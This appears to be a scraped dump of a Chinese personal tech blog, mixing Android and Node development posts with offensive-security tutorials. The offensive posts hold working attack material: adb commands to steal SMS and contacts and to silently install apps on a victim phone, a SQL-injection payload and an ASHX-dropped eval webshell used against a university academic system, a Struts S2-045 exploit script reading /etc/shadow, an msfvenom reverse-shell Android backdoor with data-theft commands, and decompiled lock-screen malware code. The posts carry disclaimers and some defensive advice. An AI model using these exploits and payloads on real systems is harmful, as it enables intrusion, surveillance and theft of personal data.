&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。 正文 安卓环境就不多说了。 1 创建一个安卓工程项目初识状态 2 导入xposed的jar包下载地址： https://bintray.com/rovo89/de.robv.android.xposed/api下载里面的api-82-sources.jar和api-82.jar导入到项目的lib目录下 3 修改AndroidManifest.xml在application节点中加入代码 123456789&lt;meta-data android:name=\"xposedmodule\" android:value=\"true\" /&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"Hook log test\" /&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"53\" /&gt; 4 修改build.gradleprovided 方式导入jar包123456dependencies &#123; compile 'com.android.support:appcompat-v7:25.2.0' testCompile 'junit:junit:4.12' provided 'de.robv.android.xposed:api:82' provided 'de.robv.android.xposed:api:82:sources'&#125; 注意,注意,注意,注意,注意,注意这里默认有个 compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) 一定要删掉。 5 创建一个类创建一个Tutorial类，继承IXposedHookLoadPackage 12345public class Tutorial implements IXposedHookLoadPackage &#123; public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable &#123; XposedBridge.log(\"正在加载中.....\" + lpparam.packageName); &#125;&#125; 6 创建入口文件。创建一个assets文件，并且在里面创建一个xposed_init文件。xposed_init里面内容为Tutorial的完全路径hk.myapplication03.Tutorial //完整类名:包名+类名 Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。查看一下log日志。 OK了， 环境搭建完成并且成功的实现了一个简单的HOOK","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"}]},{"title":"adb指令渗透手机获取隐私信息","date":"2017-03-17T03:00:20.000Z","path":"cj48bmend0007c0w6gi6lg569/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。 发送短信 控制受害者手机发送短信，这个只需要三条命令就可以达到。 打开了短信应用程序，当前焦点在文本框 adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true焦点去到发送按键 adb shell input keyevent 22回车，就是按下发送键 adb shell input keyevent 66 监视受害者手机 对受害者手机屏幕录屏，然后从手机传输到电脑。 adb shell screenrecord /sdcard/test.mp4录制完毕后再从手机传输到电脑中 adb pull /sdcard/test.mp4 d:\\test.mp4其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。 adb shell screenrecord –size 848x480 /sdcard/test.mp4 静默安装程序 将恶意程序静默安装在受害者手机内。 adb install d:/test.apk打开启动程序 adb shell am start -n hk.myapplication/hk.myapplication.MainActivityhk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径. 窃取通讯录短信等隐私。 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。通讯录和通话记录的数据库存放在/data/data/com.android.providers.contacts/databases/contacts2.db短信的数据库存放在/data/data/com.android.providers.telephony/databases/mmssms.dbps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。另外所有安卓手机中，我们手机拍摄的照片都会保存在/sdcard/DCIM这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。 末尾 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施 不要使用安全性未知的数据线连接自己的手机。 在非需要调试的情况下，不要开启adb调试。 安装可靠的手机杀毒软件。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"某教务系统注入getshell提权一条龙(下)","date":"2017-03-14T03:14:42.000Z","path":"cj48bmer1001jc0w6mntw1ano/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。 漏洞详情 登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传 这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话 poc:12345678910111213141516171819&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler &#123; public void ProcessRequest (HttpContext context) &#123; context.Response.ContentType = &quot;text/plain&quot;; string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); file1.Write(show); file1.Flush(); file1.Close(); &#125; public bool IsReusable &#123; get &#123; return false; &#125; &#125; &#125; 会上传在wbwj目录下 访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper 一句话地址，http://***.***.com/wbwj/root.aspx 连接之 看下权限,还是挺大的， 直接上传神器提权之。 3389端口没有改，直接连接。 在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。 在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码 总结 这个是什么教务系统就不多说，用过的一看就知道。有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"某教务系统注入getshell提权一条龙(上)","date":"2017-03-14T03:14:26.000Z","path":"cj48bmeql001gc0w6vy0ms4u7/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。 漏洞详情 今天的目标 找到webservice接口，路径在service.asmx 漏洞在于 GetStuCheckinInfo这个接口 我们只需要关注xh和 strKey 这两个节点就可以了。 其中的strKey都是默认的KKKGZ2312 Xh这个节点就是我们的注入语句了。 poc:123222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01 yhb 用户表yhm 用户名kl 口令 表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01) 构造好语句开始注入 可以看到jwc01用户的密码密文出来了。 我们拿去解密 Ok可以登录了 Bingo 靓女多多， 总结 不想让文章太长，getshell提权部分就放在下篇。后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"s2-045任意命令执行exp","date":"2017-03-07T08:19:32.000Z","path":"cj48bmeo9000hc0w61lvc64oh/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了 详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现. 涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。 可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。 目前官方已确认(漏洞编号S2-045) poc 1234567891011121314151617#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openers def poc(): register_openers() datagen, header = multipart_encode(&#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\" header[\"Content-Type\"]=\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\" request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read() poc() 末尾希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"React-Native电商项目源码","date":"2017-02-23T05:57:29.000Z","path":"cj48bmemy0004c0w6msdyg3rr/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。 &nbsp;&nbsp;项目用的es6 接口 接口方面全部用的本地json文件。 库 react-native-tab-navigator 运行 npm install react-native run-android 演示 项目地址 https://github.com/Y00z/react-navie_store","tags":[{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"},{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"}]},{"title":"微信小程序app源码","date":"2017-02-06T02:16:04.000Z","path":"cj48bmeq5001bc0w6gmed331g/","text":"前言 小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。微信小程序本身就很简单，和react-native很多相似处。为防止数据泄漏，我就把接口换成了死数据。使用到了下拉刷新，上拉加载更多，wx-charts框架等 登录 主页 图表 菜单 列表 详情 源码 https://github.com/Y00z/wx_acm","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"小程序","slug":"小程序","permalink":"http://y00z.github.io/tags/小程序/"}]},{"title":"drozer对app安全测试","date":"2017-02-04T03:44:08.000Z","path":"cj48bment000ac0w64w6piu0b/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。 配置环境 电脑和手机都需要安装drozer下载地址https://www.mwrinfosecurity.com/products/drozer/community-edition/我电脑是windows的，安装完毕后，dos切换到drozer安装目录。 连接手机 然后手机上安装好drozer并且开启server默认端口31415 然后手机打开调试usb连接电脑，输入指令做端口转发 adb forward tcp:31415 tcp:31415必须在adb devices 有显示手机设备才可以。dos中，在drozer安装目录输入指令drozer console connect连接成功了。 功能介绍所有的模块 list查看框架所有的模块 run app.package.list列出手机上所有应用包名 查看包名 run app.package.listps: 为了一些有心人士,所以打了码,不好意思。加上-f参数，搜索特定包名支持模糊搜索： run app.package.list -f (string to be searched) 查看包详情 run app.package.info –a (package name) 扫描攻击面 扫描指定app的攻击面。 run app.package.attacksurface (package name)可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息 查看暴露的页面 run app.activity.info –a (package name)如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。 打开暴露的页面 run app.activity.start –component (package name) (activity name)会直接启动该activity。就这样我们成功绕过了登录认证。由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。 漏洞原因 在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。ps:其实这个app本来是没这个属性，我为了方便演示才加上的。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"对安卓锁机恶意程序反编译分析","date":"2017-01-08T06:08:50.000Z","path":"cj48bmepp0015c0w6qzue38i5/","text":"前言 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。 正文 锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至栈顶端。 第一种 在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。 第二种 这种也就是这篇博文主要讲的了。ApkTool用来逆向反编译。主要文件，混淆了方法名和类名。重要的是ijm-x86.so这个so文件,后面有讲解先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码123456789101112131415161718192021@Overrideprotected void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); setContentView(2130903040); this.b = ((Button)findViewById(2131099651)); this.t = ((EditText)findViewById(0)); Button localButton = this.b; ButtonClickListener localButtonClickListener = new ButtonClickListener(); localButton.setOnClickListener(localButtonClickListener); try &#123; StringBuffer localStringBuffer = new StringBuffer(); d(this.path + \"/zihao.l\"); return; &#125; catch (IOException localIOException) &#123; &#125;&#125; this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。 123456789101112131415161718private void d(String paramString) throws IOException&#123; FileOutputStream localFileOutputStream = new FileOutputStream(paramString); InputStream localInputStream = getAssets().open(\"ijm-x86.so\"); byte[] arrayOfByte = new byte[1024]; for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte)) &#123; if (i &lt;= 0) &#123; localFileOutputStream.flush(); localInputStream.close(); localFileOutputStream.close(); return; &#125; localFileOutputStream.write(arrayOfByte, 0, i); &#125;&#125; 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l再来看看ButtonClickListener的点击事件。123456789101112131415 private final class ButtonClickListener implements View.OnClickListener&#123; public ButtonClickListener() &#123; &#125; @Override public void onClick(View paramView) &#123; b localb = new b(); localb.rootShell(); a.deleteFile(c.this.file); &#125;&#125; 执行了b对象中的rootShell方法。我们继续跟进。1234void rootShell()&#123; execCommand(new String[] &#123; \"mount -o rw,remount /system\", \"mount -o rw,remount /system/app\", \"cp /sdcard/zihao.l /system/app/\", \"chmod 777 /system/app/zihao.l\", \"mv /system/app/zihao.l /system/app/zihao.apk\", \"chmod 644 /system/app/zihao.apk\", \"reboot\" &#125;, true);&#125; 很明显，这个是执行shell命令的代码。先把/system 和 /system/app 设置可读可写。再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。最后再重启。/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。 分析第二层 同样的手法，找到app的入口Activity. 1234567@Overridepublic void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); activiteDevice();&#125; 继续跟进 123456789101112131415161718private void activiteDevice()&#123; Intent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\"); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.MyAdmin\"); ComponentName localComponentName = new ComponentName(this, localClass); localIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", localComponentName); startActivityForResult(localIntent, 0); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError;&#125; 操作打开激活设备管理器的界面 来看看MyAdmin里面的代码。 123456789101112131415161718192021@Override public void onEnabled(Context paramContext, Intent paramIntent) &#123; String str = Integer.toString(1997); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.s\"); Intent localIntent = new Intent(paramContext, localClass); localIntent.setFlags(268435456); paramContext.startService(localIntent); getManager(paramContext).resetPassword(str, 0); super.onEnabled(paramContext, paramIntent); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError; &#125; 用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。跟进看看这个服务做了些什么。s里面杂乱代码太多，我们直接来看主要的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private void c()&#123; WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams(); this.wmParams = localLayoutParams; Application localApplication = getApplication(); getApplication(); this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE)); this.wmParams.type = 2010; this.wmParams.format = 1; this.wmParams.flags = 1280; this.wmParams.gravity = 49; this.wmParams.x = 0; this.wmParams.y = 0; this.wmParams.width = -1; this.wmParams.height = -1; this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null); MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648); localMediaPlayer.setLooping(true); localMediaPlayer.start(); this.mWindowManager.addView(this.mFloatLayout, this.wmParams); this.bt = ((Button)this.mFloatLayout.findViewById(2131361794)); this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792)); this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793)); try &#123; this.ed.setHint(\"宝贝在这输入密码！\"); this.tv.append(\"恭喜中奖\"); Button localButton = this.bt; 100000001 local100000001 = new View.OnClickListener() &#123; @Override public void onClick(View paramView) &#123; try &#123; if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString(\"passw\", \"\")))) &#123; s.access$L1000001(s.this).removeView(s.access$L1000002(s.this)); s.this.stopSelf(); &#125; return; &#125; catch (Exception localException) &#123; &#125; &#125; &#125;; localButton.setOnClickListener(local100000001); &#125; catch (Exception localException1) &#123; try &#123; TextView localTextView = this.tv; StringBuffer localStringBuffer1 = new StringBuffer(); StringBuffer localStringBuffer2 = new StringBuffer(); localTextView.append(localStringBuffer2.append(\"\\n\").append(this.des.decrypt(\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\")).toString() + this.share.getLong(\"m\", 0)); return; localException1 = localException1; &#125; catch (Exception localException2) &#123; &#125; &#125;&#125; 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。重点：布局文件的type和flags属性。可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。 总结 这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了 解决办法。 手机必须是开启usb调试，连接电脑adb shell进入手机base shell，进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。 末尾 为了不让恶意程序流传，我就不分享源程序了。不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。链接: http://pan.baidu.com/s/1mi0roJA 密码: 6xqi","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"反编译","slug":"反编译","permalink":"http://y00z.github.io/tags/反编译/"}]},{"title":"安卓源码三连发","date":"2017-01-06T06:11:27.000Z","path":"cj48bmepp0017c0w6cdwd265r/","text":"前言 早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android. 学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习. 手机安全卫士 https://github.com/Y00z/android_security 新闻客户端 https://github.com/Y00z/android_news 应用市场 https://github.com/Y00z/android_googlePlay 尾声 移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.门槛不高，第三方框架和解决方案太多太多了.个人目前正在学习研究nodejs，react，react-native，python.欢迎志向相同的朋友交流一起学习","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"node开发电影站项目","date":"2016-12-20T08:45:59.000Z","path":"cj48bment000dc0w6se71ung9/","text":"NodeJs + MongoDb + express4搭建电影站简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。 数据库 MongoDb web框架 express4 前端 ejs 构建 grunt 前端 观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。 后端 对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。需要用户的role大于50也就是管理员权限才可以访问后台 运行* npm install * grunt 首页 添加电影 电影列表 分页 搜索 项目地址 https://github.com/Y00z/nodejs_movie","tags":[{"name":"NodeJs","slug":"NodeJs","permalink":"http://y00z.github.io/tags/NodeJs/"},{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"}]},{"title":"msf渗透android并植入后门","date":"2016-12-19T07:32:08.000Z","path":"cj48bmeo9000ec0w64ivfxjzh/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 。团队合作，在Metasploit和综合报告提出了他们的发现。 环境 BackBox、kali linux、或者BackTrack(kali linux的前身) 一台安卓设备 环境不说太多介绍了，直接来实战。 生成payload装好环境后查看自己的ip 生成一个payload msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk p 设置要使用的payload LHOST 设置用来接收反弹连接的主机 LPORT 设置用来接收反弹连接的端口 很小，才8kb如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。生成的apk放到手机上安装，安装完成后是这样的。 反弹shell 启动msf依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致) * use exploit/multi/handler * set payload android/meterpreter/reverse_tcp * set LHOST 192.168.0.18 * set LPORT 2333 设置完毕后就可以输入 exploit 来执行攻击了 可以看到msf会一直在监听本机的2333端口，等待着目标连接上线然后我打开我们刚刚安装的打开后会连接到msf这样我们就拿到了手机的shell 控制指令 我来介绍几个有意思的指令。 * check_root #查看是否root * dump_calllog #下载通讯记录 * dump_contacts #下载联系人 * dump_sms #下载短信 * send_sms #发送短信 * record_mic #录音 * webcam_list #查看手机摄像头 * webcam_snap #拍照 * webcam_stream #连续拍照 * geolocate #获取目标地理位置 * upload #上传文件到手机 * download #下载手机上的文件 * shell #进入手机的bash shell check_root(检测root) 是root的设备 dump_contacts(下载联系人) 57个联系人 dump_sms(下载短信) 1271条短信 send_sms(发送短信) -d目标电话号码 -t 短信内容 record_mic(录音) -d 录音的秒数音频文件会自动保存在/var/www/html/目录下 webcam_list(检测摄像头) 2:前置摄像头1:后置摄像头 webcam_snap(拍照) -i 选择使用哪个摄像头拍照手机息屏的时候也可以拍照 webcam_stream(连续拍照) -i 指定摄像头 -d 拍照间隔(默认1800毫秒)使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片 geolocate(获取地理位置) upload(上传文件到手机) download(下载文件到手机) shell(进入手机bash shell) 最后 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"hexo+github搭建免费个人博客","date":"2016-12-14T17:06:22.000Z","path":"cj48bment000bc0w6rs1ravjq/","text":"前言 一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js. 一,搭建平台配置环境 安装Node（必须） 安装Git（必须） 申请github帐号（必须） 这三个就不用多说了。 配置github &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting 往下拉有个launch automatic page generator 输入标题和内容 完成后选择样式主题 选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果https://zhangsan.github.io/ 二,hexo生成博客安装hexo* npm install -g hexo * npm install hexo-deployer-git --save 安装成功后输入命令 hexo init blogname ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了 设置主题 主题: https://hexo.io/themes/ 找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中 * git clone https://github.com/iissnan/hexo-theme-next.git themes/next 把hexo主题克隆到博客文件夹中。然后再打开博客主页中的_config.yml，找到theme,后面加上我们主题的名字如theme: next最后运行hexo s可以来查看效果了浏览器输入 http://localhost:4000查看效果。 三,同步github设置ssh key 首先进入到C:\\Users\\username\\.ssh文件夹中，把里面文件都删掉然后输入命令输入bash(配置git环境才有),进入bash shell再来依次输入命令生成ssh * ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车) * ssh-agent –s * ssh-add ~/.ssh/id_rsa * eval `ssh-agent -s * ssh-add 如果输出了ssh目录呢,就说明生成成功了 进入C:\\Users\\username\\.ssh目录,id_rsa.pub文件就是我们的key。 github设置ssh key 打开github的setting下面有一个SSH and GPG keys然后New ssh key，就可以输入标题和key了标题随意，key就是C:\\Users\\username\\.ssh\\id_rsa.pub中的内容，全部复制粘贴过去。Add SSH key 就ok了 测试 在bash shell中输入ssh git@github.com 注意：提示yes or no的话，一定要输入yes，千万别直接回车。如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了 hexo同步到github 打开blog文件夹中的_config.yml,在最后一行加上 * deploy: * type: git * repository: 